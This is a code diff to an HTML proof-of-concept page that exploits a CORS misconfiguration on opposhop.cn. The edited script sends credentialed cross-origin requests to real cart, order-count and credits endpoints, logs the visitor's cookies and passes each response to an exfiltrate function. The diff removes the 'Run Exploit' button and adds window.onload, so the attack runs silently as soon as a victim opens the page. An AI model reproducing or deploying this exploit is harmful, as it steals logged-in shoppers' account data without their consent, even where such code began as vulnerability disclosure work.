@@ -8,7 +8,6 @@
 <body>
 
 <h2>OPPO CORS Exploit Proof of Concept</h2>
-<button onclick="run()">Run Exploit</button>
 
 <pre id="output">Loading...</pre>
 
@@ -28,9 +27,17 @@ function exfiltrate(label, data) {
 
 function fetchData(url, label) {
     fetch(url, {
-        credentials: "include"
+        method: "GET",
+        mode: "cors",
+        credentials: "include",
+        cache: "no-store",
+        redirect: "follow",
+        referrerPolicy: "no-referrer-when-downgrade"
     })
-    .then(r => r.text())
+    .then(r => {
+        console.log(label + " status:", r.status);
+        return r.text();
+    })
     .then(data => {
         document.getElementById("output").innerText += "\n\n### " + label + "\n" + data;
         exfiltrate(label, data);
@@ -44,6 +51,8 @@ function run() {
 
     document.getElementById("output").innerText = "";
 
+    console.log("Cookies:", document.cookie);
+
     fetchData("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
 
     fetchData("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
@@ -54,6 +63,8 @@ function run() {
 
     fetchData("https://www.opposhop.cn/cn/oapi/credits/web/credits/show", "credits_new");
 }
+
+window.onload = run;
 </script>
 
 </body>
